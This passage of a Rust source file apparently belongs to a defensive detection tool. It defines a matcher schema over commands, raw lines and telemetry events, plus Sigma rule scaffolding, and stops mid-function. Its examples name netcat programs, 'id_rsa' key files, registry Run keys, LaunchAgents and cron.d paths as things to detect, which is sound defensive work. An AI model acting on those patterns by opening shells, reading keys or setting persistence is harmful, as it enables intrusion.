//! The structured matcher. A [`Matcher`] is a small, hand-authorable predicate
//! over a parsed [`Command`] and its raw line — the single matching schema a
//! knowledge-base entry carries (under its `match` key). It describes
//! *detectability* only — "what would a defender see?" — and encodes no evasion
//! semantics.
//!
//! ## The axes
//! - `program` — who ran: an exact basename or an any-of set.
//! - `args`   — a predicate tree over the resolved argument vector.
//! - `line`   — a predicate over the whole raw line (for redirections, pipes,
//!   and markers that span tokens).
//! - `event`  — a predicate tree over a *non-execution* record's fields
//!   (network / file / registry). Orthogonal to the three command axes: it
//!   matches a standalone sensor event, with no command line involved.
//!
//! Leaf predicates such as `word` (word-boundary) and `path_under`
//! (path-segment aware) exist to kill the substring false positives that plain
//! `contains` produced — e.g. `/var/log` matching `cd /var/log`, or `id_rsa`
//! matching `id_rsa_notes.txt`.

use std::collections::HashMap;

use serde::Deserialize;

use crate::parser::Command;

/// A structured predicate matching a parsed command within its raw line.
///
/// The command axes (`program` / `args` / `line`) are optional. When `program`
/// is present the matcher is command-scoped: some command in the unit must
/// satisfy `program` (and `args` / `line`, if given). When `program` is absent
/// the matcher is line-scoped: the raw line must satisfy `line`. The `event` axis
/// is orthogonal: it matches a *non-execution* record (network / file / registry)
/// by its fields rather than a command line, for entries recognized from
/// standalone telemetry with no captured `execve`.
#[derive(Debug, Clone, Default, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Matcher {
    /// Who ran: the resolved program basename. `None` places no constraint.
    #[serde(default)]
    pub program: Option<ProgramMatch>,
    /// A predicate tree over the resolved argument vector. `None` places no
    /// constraint.
    #[serde(default)]
    pub args: Option<ArgPred>,
    /// A predicate over the whole raw line, for markers that span tokens.
    /// `None` places no constraint.
    #[serde(default)]
    pub line: Option<LinePred>,
    /// A predicate over a non-execution record's fields. Orthogonal to the
    /// three axes above — an entry carrying this is recognized from standalone
    /// telemetry, with no command line involved.
    #[serde(default)]
    pub event: Option<EventMatch>,
}

/// The class of non-execution record an [`EventMatch`] applies to. Validated at
/// deserialization, so an unrecognized class is a load error rather than an entry
/// that silently never fires.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum EventClass {
    /// An outbound connection (Sysmon EID 3, auditd `SOCKADDR`, ESF connect).
    Network,
    /// A file create / open / write (Sysmon EID 11, auditd `PATH`, ESF
    /// `NOTIFY_OPEN` / `NOTIFY_CREATE` / `NOTIFY_WRITE`).
    File,
    /// A registry value set (Sysmon EID 13). Windows-only in practice.
    Registry,
}

impl EventClass {
    /// The lowercase tag the telemetry layer uses on
    /// [`EventObservation::class`](crate::telemetry::EventObservation::class).
    pub fn as_str(self) -> &'static str {
        match self {
            EventClass::Network => "network",
            EventClass::File => "file",
            EventClass::Registry => "registry",
        }
    }

    /// The Sigma `logsource.category` a rule over this class of record declares.
    /// A scaffolded event rule is emitted under this category; the same mapping
    /// is what tells whether a candidate rule is asking about the same kind of
    /// record an entry's `event` axis describes.
    pub fn sigma_category(self) -> &'static str {
        match self {
            EventClass::Network => "network_connection",
            EventClass::File => "file_event",
            EventClass::Registry => "registry_set",
        }
    }
}

/// A predicate over a non-execution event's fields: the event `class`
/// (`network` / `file` / `registry`) and a predicate tree over the record's named
/// fields. Evaluated against the same field map the ingest builds for observed
/// Sigma evaluation.
///
/// The single-field form is the degenerate case of the tree, so
/// `{ "class": "registry", "field": "TargetObject", "contains": "\\Run" }` and
/// `{ "class": "network", "all": [ … ] }` are the same grammar — the former is one
/// [`FieldPred`] hoisted to the top.
#[derive(Debug, Clone, Deserialize)]
pub struct EventMatch {
    /// The event class this applies to.
    pub class: EventClass,
    /// The predicate over the record's fields.
    #[serde(flatten)]
    pub pred: EventPred,
}

/// A predicate over a non-execution record's field map: either a combinator or a
/// test on one named field.
#[derive(Debug, Clone, Deserialize)]
#[serde(untagged)]
pub enum EventPred {
    /// `all` / `any` / `not` over sub-predicates.
    Comb(EventComb),
    /// A test on a single named field.
    Field(FieldPred),
}

/// The `all` / `any` / `not` combinators of the [`event`](EventMatch) axis. They
/// compose predicates, mirroring [`ArgPred`] and [`LinePred`].
#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum EventComb {
    /// Every sub-predicate holds.
    All(Vec<EventPred>),
    /// Some sub-predicate holds.
    Any(Vec<EventPred>),
    /// The sub-predicate does not hold.
    Not(Box<EventPred>),
}

/// A test on one named event field. Exactly one leaf must be set — several, or
/// none, is an authoring mistake rejected at load (see [`EventMatch::validate`]).
/// The leaves mirror the `line` axis, plus `path_under`, because event fields are
/// so often filesystem or registry paths.
#[derive(Debug, Clone, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct FieldPred {
    /// The event field to test, by its canonical name (e.g. `TargetObject`).
    /// Looked up case-insensitively.
    pub field: String,
    /// The field contains this substring.
    #[serde(default)]
    pub contains: Option<String>,
    /// The field equals this string.
    #[serde(default)]
    pub eq: Option<String>,
    /// The field starts with this string.
    #[serde(default)]
    pub prefix: Option<String>,
    /// The field ends with this string.
    #[serde(default)]
    pub suffix: Option<String>,
    /// The field contains this token on word boundaries.
    #[serde(default)]
    pub word: Option<String>,
    /// The field is a path equal to, or nested under, this directory
    /// (segment-aware).
    #[serde(default)]
    pub path_under: Option<String>,
    /// The field matches this regular expression.
    #[serde(default)]
    pub regex: Option<Re>,
}

impl FieldPred {
    /// Exactly one leaf must be set and non-empty. An empty `contains` would match
    /// every value, so it is rejected rather than matching broadly.
    fn validate(&self) -> Result<(), String> {
        let literals = [
            &self.contains,
            &self.eq,
            &self.prefix,
            &self.suffix,
            &self.word,
            &self.path_under,
        ];
        let set =
            literals.iter().filter(|l| l.is_some()).count() + usize::from(self.regex.is_some());
        match set {
            0 => Err(format!("event field `{}` sets no predicate", self.field)),
            1 => {
                if literals.iter().any(|l| l.as_deref() == Some("")) {
                    Err(format!(
                        "event field `{}` has an empty predicate",
                        self.field
                    ))
                } else if self.field.is_empty() {
                    Err("event predicate has an empty `field`".into())
                } else {
                    Ok(())
                }
            }
            _ => Err(format!(
                "event field `{}` sets more than one predicate",
                self.field
            )),
        }
    }

    /// Whether this leaf holds against `fields`. The field name is matched
    /// case-insensitively: the ingest layer canonicalizes casing, but each format
    /// names its own extras, so an author should not have to guess the casing.
    fn eval(&self, fields: &HashMap<String, String>) -> bool {
        let Some(val) = lookup_ci(fields, &self.field) else {
            return false;
        };
        if let Some(s) = &self.contains {
            return !s.is_empty() && contains_ci(val, s);
        }
        if let Some(s) = &self.eq {
            return !s.is_empty() && val.eq_ignore_ascii_case(s);
        }
        if let Some(s) = &self.prefix {
            return !s.is_empty() && starts_with_ci(val, s);
        }
        if let Some(s) = &self.suffix {
            return !s.is_empty() && ends_with_ci(val, s);
        }
        if let Some(s) = &self.word {
            return word_match(val, s);
        }
        if let Some(s) = &self.path_under {
            return path_under(val, s);
        }
        if let Some(re) = &self.regex {
            return re.is_match(val);
        }
        false
    }
}

/// Look a field up by name, case-insensitively. Exact hit first — the common case
/// and a plain hash lookup — falling back to a scan only when that misses.
fn lookup_ci<'a>(fields: &'a HashMap<String, String>, name: &str) -> Option<&'a str> {
    if let Some(v) = fields.get(name) {
        return Some(v.as_str());
    }
    fields
        .iter()
        .find(|(k, _)| k.eq_ignore_ascii_case(name))
        .map(|(_, v)| v.as_str())
}

impl EventPred {
    fn eval(&self, fields: &HashMap<String, String>) -> bool {
        match self {
            EventPred::Comb(EventComb::All(v)) => v.iter().all(|p| p.eval(fields)),
            EventPred::Comb(EventComb::Any(v)) => v.iter().any(|p| p.eval(fields)),
            EventPred::Comb(EventComb::Not(p)) => !p.eval(fields),
            EventPred::Field(f) => f.eval(fields),
        }
    }

    fn validate(&self) -> Result<(), String> {
        match self {
            EventPred::Comb(EventComb::All(v)) | EventPred::Comb(EventComb::Any(v)) => {
                if v.is_empty() {
                    return Err("event `all`/`any` group is empty".into());
                }
                v.iter().try_for_each(EventPred::validate)
            }
            EventPred::Comb(EventComb::Not(p)) => p.validate(),
            EventPred::Field(f) => f.validate(),
        }
    }
}

impl EventMatch {
    /// Validate the whole predicate tree: every leaf sets exactly one non-empty
    /// test, and no `all`/`any` group is empty. Rejected at load (see
    /// [`crate::model::KnowledgeBase::validate`]) rather than matching broadly.
    pub fn validate(&self) -> Result<(), String> {
        self.pred.validate()
    }

    /// Whether this predicate holds for a record of the given `class` and fields.
    fn eval(&self, class: &str, fields: &HashMap<String, String>) -> bool {
        self.class.as_str().eq_ignore_ascii_case(class) && self.pred.eval(fields)
    }
}

/// How to match the program basename: exact (a bare string) or any-of a set.
#[derive(Debug, Clone, Deserialize)]
#[serde(untagged)]
pub enum ProgramMatch {
    /// `"program": "curl"` — exact basename, case-insensitive.
    Exact(String),
    /// `"program": { "any": ["nc", "ncat"] }` — any of these basenames.
    AnyOf {
        /// The accepted basenames, case-insensitive.
        any: Vec<String>,
    },
}

/// A predicate over a command's argument vector. Leaf predicates are
/// *existential over the arguments* ("some argument satisfies this"); the
/// `all` / `any` / `not` combinators compose predicates, not arguments.
#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ArgPred {
    /// Every sub-predicate holds.
    All(Vec<ArgPred>),
    /// Some sub-predicate holds.
    Any(Vec<ArgPred>),
    /// The sub-predicate does not hold (e.g. a flag is absent).
    Not(Box<ArgPred>),
    /// Some argument equals this flag token exactly (case-insensitive), e.g. `-e`.
    Flag(String),
    /// Some argument equals this string (case-insensitive).
    Eq(String),
    /// Some argument contains this substring.
    Contains(String),
    /// Some argument starts with this string.
    Prefix(String),
    /// Some argument ends with this string.
    Suffix(String),
    /// Some argument contains this token on word boundaries.
    Word(String),
    /// Some argument is a path equal to, or nested under, this directory
    /// (segment-aware: `/var/log/nginx` is under `/var/log`; `/var/logistics`
    /// is not).
    PathUnder(String),
    /// The argument at a fixed position satisfies a leaf string match.
    At(PosMatch),
    /// A leaf string match against all arguments joined by spaces — for a phrase
    /// that spans several argument tokens, e.g. `process call create`.
    Joined(StrLeaf),
    /// Some argument matches this regular expression (case-insensitive).
    Regex(Re),
}

/// A positional argument match: the argument at `index` must satisfy `value`.
#[derive(Debug, Clone, Deserialize)]
pub struct PosMatch {
    /// 0-based position in the argument vector, not counting the program.
    pub index: usize,
    /// The test the argument at `index` must satisfy.
    pub value: StrLeaf,
}

/// A predicate over the whole raw line, for markers that span tokens
/// (redirections, pipes, socket paths).
#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum LinePred {
    /// Every sub-predicate holds.
    All(Vec<LinePred>),
    /// Some sub-predicate holds.
    Any(Vec<LinePred>),
    /// The sub-predicate does not hold.
    Not(Box<LinePred>),
    /// The line contains this substring (case-insensitive).
    Contains(String),
    /// The line contains this token on word boundaries.
    Word(String),
    /// The line starts with this string.
    Prefix(String),
    /// The line ends with this string.
    Suffix(String),
    /// The line matches this regular expression (case-insensitive).
    Regex(Re),
}

/// A leaf string match against a single value (used by `at` and `joined`).
#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum StrLeaf {
    /// The value equals this string, case-insensitively.
    Eq(String),
    /// The value contains this substring, case-insensitively.
    Contains(String),
    /// The value starts with this string.
    Prefix(String),
    /// The value ends with this string.
    Suffix(String),
    /// The value contains this token on word boundaries — `id_rsa` matches
    /// `id_rsa` but not `id_rsa_notes.txt`.
    Word(String),
    /// A regular expression (case-insensitive) the value must match.
    Regex(Re),
}

/// A compiled regular expression, deserialized from its source string. The
/// pattern is compiled once at knowledge-base load — an invalid pattern is a
/// load-time error, not a silent no-match — and matched case-insensitively for
/// consistency with the other leaves. Author-facing: an entry that uses a
/// `regex` leaf must also carry an `example`, since a pattern (unlike a literal)
/// cannot be reversed into a representative command (see `KbEntry::example`).
#[derive(Debug, Clone)]
pub struct Re {
    src: String,
    re: regex::Regex,
}

impl Re {
    fn is_match(&self, value: &str) -> bool {
        self.re.is_match(value)
    }

    /// The original pattern source (for scaffolding a Sigma `|re` selection).
    pub fn as_str(&self) -> &str {
        &self.src
    }
}

impl<'de> Deserialize<'de> for Re {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        let src = String::deserialize(deserializer)?;
        let re = regex::RegexBuilder::new(&src)
            .case_insensitive(true)
            .build()
            .map_err(serde::de::Error::custom)?;
        Ok(Re { src, re })
    }
}

// --- matching engine -------------------------------------------------------

impl Matcher {
    /// Whether this entry's `event` axis matches a non-execution record of the
    /// given `class` and field map. `false` for a command-only matcher.
    pub fn evaluate_event(&self, class: &str, fields: &HashMap<String, String>) -> bool {
        self.event.as_ref().is_some_and(|e| e.eval(class, fields))
    }

    /// Evaluate the matcher against a unit's commands and its raw line.
    ///
    /// Returns `None` when the matcher does not apply. Returns `Some(mc)` when it
    /// does, where `mc` is the specific command that matched (for command-scoped
    /// matchers) or the unit's first command (for line-scoped matchers) — the
    /// `matched_command` that downstream coverage/Sigma evaluation keys on.
    pub fn evaluate(&self, commands: &[Command], raw: &str) -> Option<Option<Command>> {
        if self.program.is_some() {
            commands
                .iter()
                .find(|c| self.matches_command(c, raw))
                .cloned()
                .map(Some)
        } else {
            // Line-scoped: with no `program` and no `line`, a matcher matches
            // nothing.
            let line = self.line.as_ref()?;
            line.eval(raw).then(|| commands.first().cloned())
        }
    }

    /// Does a single command satisfy every present axis of this matcher?
    fn matches_command(&self, cmd: &Command, raw: &str) -> bool {
        if let Some(p) = &self.program
            && !p.matches(&cmd.program)
        {
            return false;
        }
        if let Some(a) = &self.args
            && !a.eval(&cmd.args)
        {
            return false;
        }
        if let Some(l) = &self.line
            && !l.eval(raw)
        {
            return false;
        }
        true
    }
}

impl ProgramMatch {
    fn matches(&self, program: &str) -> bool {
        match self {
            ProgramMatch::Exact(p) => program.eq_ignore_ascii_case(p),
            ProgramMatch::AnyOf { any } => any.iter().any(|p| program.eq_ignore_ascii_case(p)),
        }
    }
}

impl ArgPred {
    fn eval(&self, args: &[String]) -> bool {
        match self {
            ArgPred::All(v) => v.iter().all(|p| p.eval(args)),
            ArgPred::Any(v) => v.iter().any(|p| p.eval(args)),
            ArgPred::Not(p) => !p.eval(args),
            ArgPred::Flag(f) => args.iter().any(|a| a.eq_ignore_ascii_case(f)),
            ArgPred::Eq(s) => args.iter().any(|a| a.eq_ignore_ascii_case(s)),
            ArgPred::Contains(s) => args.iter().any(|a| contains_ci(a, s)),
            ArgPred::Prefix(s) => args.iter().any(|a| starts_with_ci(a, s)),
            ArgPred::Suffix(s) => args.iter().any(|a| ends_with_ci(a, s)),
            ArgPred::Word(s) => args.iter().any(|a| word_match(a, s)),
            ArgPred::PathUnder(base) => args.iter().any(|a| path_under(a, base)),
            ArgPred::At(pos) => args.get(pos.index).is_some_and(|a| pos.value.eval(a)),
            ArgPred::Joined(leaf) => leaf.eval(&args.join(" ")),
            ArgPred::Regex(re) => args.iter().any(|a| re.is_match(a)),
        }
    }

    fn has_regex(&self) -> bool {
        match self {
            ArgPred::All(v) | ArgPred::Any(v) => v.iter().any(ArgPred::has_regex),
            ArgPred::Not(p) => p.has_regex(),
            ArgPred::At(pos) => pos.value.is_regex(),
            ArgPred::Joined(leaf) => leaf.is_regex(),
            ArgPred::Regex(_) => true,
            _ => false,
        }
    }
}

impl LinePred {
    fn eval(&self, line: &str) -> bool {
        match self {
            LinePred::All(v) => v.iter().all(|p| p.eval(line)),
            LinePred::Any(v) => v.iter().any(|p| p.eval(line)),
            LinePred::Not(p) => !p.eval(line),
            LinePred::Contains(s) => contains_ci(line, s),
            LinePred::Word(s) => word_match(line, s),
            LinePred::Prefix(s) => starts_with_ci(line, s),
            LinePred::Suffix(s) => ends_with_ci(line, s),
            LinePred::Regex(re) => re.is_match(line),
        }
    }

    fn has_regex(&self) -> bool {
        match self {
            LinePred::All(v) | LinePred::Any(v) => v.iter().any(LinePred::has_regex),
            LinePred::Not(p) => p.has_regex(),
            LinePred::Regex(_) => true,
            _ => false,
        }
    }
}

impl StrLeaf {
    fn eval(&self, value: &str) -> bool {
        match self {
            StrLeaf::Eq(s) => value.eq_ignore_ascii_case(s),
            StrLeaf::Contains(s) => contains_ci(value, s),
            StrLeaf::Prefix(s) => starts_with_ci(value, s),
            StrLeaf::Suffix(s) => ends_with_ci(value, s),
            StrLeaf::Word(s) => word_match(value, s),
            StrLeaf::Regex(re) => re.is_match(value),
        }
    }

    fn is_regex(&self) -> bool {
        matches!(self, StrLeaf::Regex(_))
    }
}

// --- leaf helpers ----------------------------------------------------------

fn contains_ci(haystack: &str, needle: &str) -> bool {
    haystack.to_lowercase().contains(&needle.to_lowercase())
}

fn starts_with_ci(haystack: &str, needle: &str) -> bool {
    haystack.to_lowercase().starts_with(&needle.to_lowercase())
}

fn ends_with_ci(haystack: &str, needle: &str) -> bool {
    haystack.to_lowercase().ends_with(&needle.to_lowercase())
}

/// Case-insensitive substring match requiring a non-word character (or the
/// string edge) on both sides. A "word character" is `[A-Za-z0-9_]`. This is
/// what stops `id_rsa` from matching inside `id_rsa_notes.txt`.
fn word_match(haystack: &str, needle: &str) -> bool {
    if needle.is_empty() {
        return false;
    }
    let h = haystack.to_lowercase();
    let n = needle.to_lowercase();
    let hb = h.as_bytes();
    let is_word = |b: u8| b.is_ascii_alphanumeric() || b == b'_';
    let mut from = 0;
    while let Some(rel) = h[from..].find(&n) {
        let i = from + rel;
        let before_ok = i == 0 || !is_word(hb[i - 1]);
        let after = i + n.len();
        let after_ok = after >= hb.len() || !is_word(hb[after]);
        if before_ok && after_ok {
            return true;
        }
        from = i + 1;
    }
    false
}

/// Is `arg`, read as a filesystem path, equal to or nested under `base`? Compares
/// whole path segments (case-insensitive, trailing slashes ignored), so
/// `/var/log/nginx` is under `/var/log` but `/var/logistics` is not.
fn path_under(arg: &str, base: &str) -> bool {
    let a = arg.to_lowercase();
    let b = base.to_lowercase();
    let a = a.trim_end_matches('/');
    let b = b.trim_end_matches('/');
    if b.is_empty() {
        return false;
    }
    a == b || a.starts_with(&format!("{b}/"))
}

// --- representative derivation ---------------------------------------------
//
// Downstream tooling (`verify`, `scaffold`) needs to turn a matcher back into a
// concrete example: a command line that the matcher would match, and the
// CommandLine substrings a mirroring Sigma `selection` should test. Both are
// derived by walking the predicate tree for the literals a match keys on.

impl Matcher {
    /// Lower the matcher into the fields a starter Sigma `selection:` should
    /// test (see [`SigmaSelection`]). Program any-of and an `any`-of-`contains`
    /// group become OR-lists; everything else is ANDed. `simplified` is set when
    /// the matcher uses alternation/nesting that a flat selection can't mirror,
    /// so the scaffold flags it for review instead of silently narrowing.
    pub fn sigma_selection(&self) -> SigmaSelection {
        let mut sel = SigmaSelection::default();
        match &self.program {
            Some(ProgramMatch::Exact(p)) => sel.image_endswith.push(p.clone()),
            Some(ProgramMatch::AnyOf { any }) => sel.image_endswith.extend(any.iter().cloned()),
            None => {}
        }
        if let Some(a) = &self.args {
            lower_arg_selection(a, &mut sel);
        }
        if let Some(l) = &self.line {
            lower_line_selection(l, &mut sel);
        }
        // A flat `CommandLine|contains` field can't hold both an AND set and a
        // separate OR-group; when both are present the OR-group is dropped at
        // render time, so flag it.
        if !sel.contains_all.is_empty() && !sel.contains_any.is_empty() {
            sel.simplified = true;
        }
        sel
    }

    /// Lower the `event` axis into the selection blocks a starter Sigma rule over
    /// non-execution records should test (see [`SigmaEventSelection`]). `None`
    /// when there is no `event` axis, or when nothing positive can be derived
    /// from it — the same condition that makes [`representative_event`] `None`.
    ///
    /// The command axes and the `event` axis describe records in *different* log
    /// sources, so they cannot share one rule; this is the event half, lowered
    /// independently of [`sigma_selection`].
    ///
    /// [`representative_event`]: Matcher::representative_event
    /// [`sigma_selection`]: Matcher::sigma_selection
    pub fn sigma_event_selection(&self) -> Option<SigmaEventSelection> {
        let event = self.event.as_ref()?;
        let mut notes = Vec::new();
        let blocks = lower_event_pred(&event.pred, &mut notes);
        let blocks: Vec<SigmaBlock> = blocks
            .into_iter()
            .filter(|b| !b.fields.is_empty())
            .collect();
        let blocks = merge_alternatives(blocks);
        (!blocks.is_empty()).then_some(SigmaEventSelection {
            class: event.class,
            blocks,
            notes,
        })
    }

    /// Whether any leaf in this matcher is a `regex`. Such an entry cannot derive
    /// its own representative from literals, so it must carry an `example`.
    pub fn has_regex(&self) -> bool {
        self.args.as_ref().is_some_and(ArgPred::has_regex)
            || self.line.as_ref().is_some_and(LinePred::has_regex)
    }

    /// A representative command line that this matcher would match, for
    /// synthesizing an example event. Returns `None` when nothing positive can
    /// be derived (e.g. a bare or purely-negated matcher).
    ///
    /// Argument literals are placed positionally so that `at` predicates land at
    /// the index they require (padding earlier positions with a filler token);
    /// existential leaves fill any free slot. Line literals are appended so the
    /// raw line carries them.
    pub fn representative_line(&self) -> Option<String> {
        let mut parts: Vec<String> = Vec::new();
        if let Some(prog) = self.program_representative() {
            parts.push(prog);
        }
        if let Some(a) = &self.args {
            parts.extend(representative_args(a));
        }
        if let Some(l) = &self.line {
            collect_line_terms(l, &mut parts);
        }
        let line = parts.join(" ");
        let line = line.trim();
        (!line.is_empty()).then(|| line.to_string())
    }

    /// A representative non-execution event this matcher's `event` axis would
    /// match: the class, and a field map built from the predicate's literals.
    /// `None` when the entry has no `event` axis, or when nothing positive can be
    /// derived (a bare `regex` or a purely-negated predicate).
    ///
    /// This is the `event`-axis counterpart of [`representative_line`] and drives
    /// the same self-consistency guard: an event entry must fire on its own
    /// representative.
    ///
    /// [`representative_line`]: Matcher::representative_line
    pub fn representative_event(&self) -> Option<(EventClass, HashMap<String, String>)> {
        let event = self.event.as_ref()?;
        let mut by_field: Vec<(String, FieldRepr)> = Vec::new();
        collect_event_repr(&event.pred, &mut by_field);
        let fields: HashMap<String, String> = by_field
            .into_iter()
            .filter_map(|(name, repr)| repr.compose().map(|v| (name, v)))
            .collect();
        (!fields.is_empty()).then_some((event.class, fields))
    }

    /// A representative program basename (exact value, or the first of an
    /// any-of set).
    fn program_representative(&self) -> Option<String> {
        match &self.program {
            Some(ProgramMatch::Exact(p)) => Some(p.clone()),
            Some(ProgramMatch::AnyOf { any }) => any.first().cloned(),
            None => None,
        }
    }
}

/// The literals gathered for one event field, before they are composed into a
/// single representative value. Several leaves can constrain the same field — the
/// LaunchAgents case is `contains "/LaunchAgents/"` **and** `suffix ".plist"` —
/// so the pieces are accumulated and assembled once, rather than overwriting each
/// other.
#[derive(Default)]
struct FieldRepr {
    eq: Option<String>,
    prefix: Option<String>,
    suffix: Option<String>,
    parts: Vec<String>,
}

impl FieldRepr {
    /// Assemble one value satisfying every gathered leaf: `prefix`, then the
    /// `contains` / `word` / `path_under` fragments in the order authored, then
    /// `suffix`. An `eq` pins the value outright.
    ///
    /// A `/` is inserted where two pieces would otherwise fuse into one word, so a
    /// `word` fragment keeps the boundaries it asked for. `/` is safe filler here:
    /// it is a non-word character, and event fields are paths.
    fn compose(self) -> Option<String> {
        if let Some(eq) = self.eq {
            return (!eq.is_empty()).then_some(eq);
        }
        let mut out = self.prefix.unwrap_or_default();
        for piece in self.parts.into_iter().chain(self.suffix) {
            if piece.is_empty() {
                continue;
            }
            let fuses = out
                .chars()
                .next_back()
                .is_some_and(|c| c.is_ascii_alphanumeric() || c == '_')
                && piece
                    .chars()
                    .next()
                    .is_some_and(|c| c.is_ascii_alphanumeric() || c == '_');
            if fuses {
                out.push('/');
            }
            out.push_str(&piece);
        }
        (!out.is_empty()).then_some(out)
    }
}

/// Gather the positive literals of an event predicate, per field, in authored
/// order. Mirrors the command-side derivation: `any` contributes only its first
/// branch, `not` contributes nothing, and a `regex` leaf contributes nothing —
/// which is what makes a bare-`regex` event predicate underivable, and so a load
/// error rather than an entry that cannot be self-checked.
fn collect_event_repr(pred: &EventPred, out: &mut Vec<(String, FieldRepr)>) {
    match pred {
        EventPred::Comb(EventComb::All(v)) => {
            for p in v {
                collect_event_repr(p, out);
            }
        }
        EventPred::Comb(EventComb::Any(v)) => {
            if let Some(first) = v.first() {
                collect_event_repr(first, out);
            }
        }
        EventPred::Comb(EventComb::Not(_)) => {}
        EventPred::Field(f) => {
            let slot = match out
                .iter_mut()
                .find(|(name, _)| name.eq_ignore_ascii_case(&f.field))
            {
                Some((_, repr)) => repr,
                None => {
                    out.push((f.field.clone(), FieldRepr::default()));
                    &mut out.last_mut().expect("just pushed").1
                }
            };
            if let Some(s) = &f.eq {
                slot.eq = Some(s.clone());
            } else if let Some(s) = &f.prefix {
                slot.prefix = Some(s.clone());
            } else if let Some(s) = &f.suffix {
                slot.suffix = Some(s.clone());
            } else if let Some(s) = f.contains.as_ref().or(f.word.as_ref()) {
                slot.parts.push(s.clone());
            } else if let Some(base) = &f.path_under {
                // A member of the directory, not the directory itself. Both
                // satisfy `path_under`, but only one of them is a record a file
                // event would ever carry: a rule watching a drop-in directory
                // keys on `startswith '/etc/cron.d/'`, which the bare base — no
                // trailing separator, no leaf — does not satisfy. Deriving the
                // base made this representative unable to stand for the thing
                // it represents.
                slot.parts
                    .push(format!("{}/{PATH_LEAF}", base.trim_end_matches('/')));
            }
        }
    }
}

/// Filler token used to pad argument positions with no constraint of their own,
/// so a later `at` index can be reached. Chosen to be inert: it satisfies no
/// leaf a real matcher keys on and trips no typical negation.
const ARG_FILLER: &str = "_";

/// Stand-in leaf name for the representative of a `path_under` event field —
/// the file inside the directory the leaf names. Inert for the same reason
/// [`ARG_FILLER`] is: it satisfies no leaf a real matcher keys on.
const PATH_LEAF: &str = "_";

/// Build a representative argument vector satisfying `pred`, honoring `at`
/// positions. Positional constraints fix specific indices; existential leaves
/// fill free slots (or append); gaps before a positional index get a filler.
fn representative_args(pred: &ArgPred) -> Vec<String> {
    let mut positional: Vec<(usize, String)> = Vec::new();
    let mut floating: Vec<String> = Vec::new();
    collect_arg_repr(pred, &mut positional, &mut floating);

    let size = positional.iter().map(|(i, _)| i + 1).max().unwrap_or(0);
    let mut slots: Vec<Option<String>> = vec![None; size];
    for (i, lit) in positional {
        slots[i] = Some(lit); // last write wins on a (pathological) index clash
    }

    let mut floating = floating.into_iter();
    let mut out: Vec<String> = slots
        .into_iter()
        .map(|slot| {
            slot.or_else(|| floating.next())
                .unwrap_or_else(|| ARG_FILLER.to_string())
        })
        .collect();
    out.extend(floating); // any existential literals beyond the fixed positions
    out
}

/// Split an argument predicate into positional `(index, literal)` constraints
/// (from `at`) and order-independent existential literals (everything else).
/// `any` takes its first branch; `not` contributes nothing positive.
fn collect_arg_repr(
    pred: &ArgPred,
    positional: &mut Vec<(usize, String)>,
    floating: &mut Vec<String>,
) {
    match pred {
        ArgPred::All(v) => v
            .iter()
            .for_each(|p| collect_arg_repr(p, positional, floating)),
        ArgPred::Any(v) => {
            if let Some(first) = v.first() {
                collect_arg_repr(first, positional, floating);
            }
        }
        ArgPred::Not(_) => {}
        ArgPred::Flag(s)
        | ArgPred::Eq(s)
        | ArgPred::Contains(s)
        | ArgPred::Prefix(s)
        | ArgPred::Suffix(s)
        | ArgPred::Word(s)
        | ArgPred::PathUnder(s) => floating.push(s.clone()),
        ArgPred::At(pos) => {
            if let Some(lit) = str_leaf_literal(&pos.value) {
                positional.push((pos.index, lit));
            }
        }
        ArgPred::Joined(leaf) => {
            if let Some(lit) = str_leaf_literal(leaf) {
                floating.push(lit);
            }
        }
        ArgPred::Regex(_) => {}
    }
}

/// A Sigma-friendly lowering of a matcher for scaffolding — the fields a starter
/// `selection:` should test (see [`Matcher::sigma_selection`]).
#[derive(Debug, Default)]
pub struct SigmaSelection {
    /// `Image|endswith` values: one for an exact program, several (OR) for any-of.
    pub image_endswith: Vec<String>,
    /// `CommandLine|contains` literals ANDed together.
    pub contains_all: Vec<String>,
    /// One `CommandLine|contains` OR-group (from an `any` of contains-like leaves).
    pub contains_any: Vec<String>,
    /// `CommandLine|re` patterns.
    pub regexes: Vec<String>,
    /// Set when alternation/nesting couldn't be represented faithfully, so the
    /// scaffold can flag itself for review instead of silently narrowing.
    pub simplified: bool,
}

/// Record an OR-group of contains literals. A matcher can carry only one such
/// group in a single flat selection; a second is flagged as `simplified`.
fn add_or_group(sel: &mut SigmaSelection, lits: Vec<String>) {
    if sel.contains_any.is_empty() {
        sel.contains_any = lits;
    } else {
        sel.simplified = true;
    }
}

/// Lower an argument predicate into the selection. `all` ANDs its children; an
/// `any` of plain contains-like leaves becomes the OR-group. A nested `any`
/// falls back to its first branch, and a `not` is dropped (unrepresentable in a
/// positive selection); both mark `simplified` so the scaffold warns.
fn lower_arg_selection(pred: &ArgPred, sel: &mut SigmaSelection) {
    match pred {
        ArgPred::All(v) => v.iter().for_each(|p| lower_arg_selection(p, sel)),
        ArgPred::Any(v) => match arg_or_literals(v) {
            Some(lits) => add_or_group(sel, lits),
            None => {
                sel.simplified = true;
                if let Some(first) = v.first() {
                    lower_arg_selection(first, sel);
                }
            }
        },
        // A `not` can't be expressed in a positive Sigma `selection:` field;
        // dropping it broadens the scaffold, so flag the loss.
        ArgPred::Not(_) => sel.simplified = true,
        ArgPred::Flag(s)
        | ArgPred::Eq(s)
        | ArgPred::Contains(s)
        | ArgPred::Prefix(s)
        | ArgPred::Suffix(s)
        | ArgPred::Word(s)
        | ArgPred::PathUnder(s) => sel.contains_all.push(s.clone()),
        ArgPred::At(PosMatch {
            value: StrLeaf::Regex(re),
            ..
        })
        | ArgPred::Joined(StrLeaf::Regex(re))
        | ArgPred::Regex(re) => sel.regexes.push(re.as_str().to_string()),
        ArgPred::At(pos) => sel.contains_all.extend(str_leaf_literal(&pos.value)),
        ArgPred::Joined(leaf) => sel.contains_all.extend(str_leaf_literal(leaf)),
    }
}

/// Lower a line predicate into the selection (see [`lower_arg_selection`]).
fn lower_line_selection(pred: &LinePred, sel: &mut SigmaSelection) {
    match pred {
